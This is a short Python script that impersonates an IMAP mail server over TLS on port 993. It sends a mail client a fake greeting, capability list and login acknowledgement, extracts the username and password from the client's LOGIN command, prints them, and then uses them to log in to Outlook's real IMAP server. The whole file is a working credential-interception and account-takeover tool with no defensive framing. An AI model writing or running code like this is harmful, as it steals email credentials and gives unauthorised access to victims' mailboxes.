import socket, ssl, imaplib

HOST, PORT, CERT = '', 993, 'cert.pem' # TODO: change 993 to 1030

def process(conn):
	# Send "OK Service Ready command to the client"
  	conn.sendall(b'* OK Service Ready. [Vg==]\r\n')
  	response = conn.recv()

  	# Send negociate commands
  	conn.sendall(b'* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN AUTH=XOAUTH2 SASL-IR UIDPLUS MOVE ID UNSELECT CHILDREN IDLE NAMESPACE LITERAL+\r\n')
  	conn.sendall(response[:5] + b' OK CAPABILITY completed.\r\n')

  	# Get identifiants and ACK login
  	response = conn.recv()
  	conn.sendall(response[:5] + b' OK LOGIN completed.\r\n')

  	ids = response.decode().split(' ')
  	username = ids[2]
  	password = ids[3][1:-3]
  	hostname = 'imap-mail.outlook.com' # TODO: get the hostname

  	print(username, password)
  	conn.close()

  	print("Connection with real server")
  	connection = imaplib.IMAP4_SSL(hostname)
  	print('Connected to', hostname)
  	connection.login(username, password)
  	print('Logged in')

def connection(ssock):
	try:
      	conn = ssl.wrap_socket(ssock, certfile=CERT, server_side=True)
      	process(conn)
   	except ssl.SSLError as e:
      	print(e)
    finally:
      	if conn:
       		conn.close()

def listening():
  	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  	sock.bind((HOST, PORT))
  	sock.listen(1)

  	while True:
    	conn = None
    	ssock, addr = sock.accept()
    	connection(ssock)

if __name__ == '__main__':
  	listening()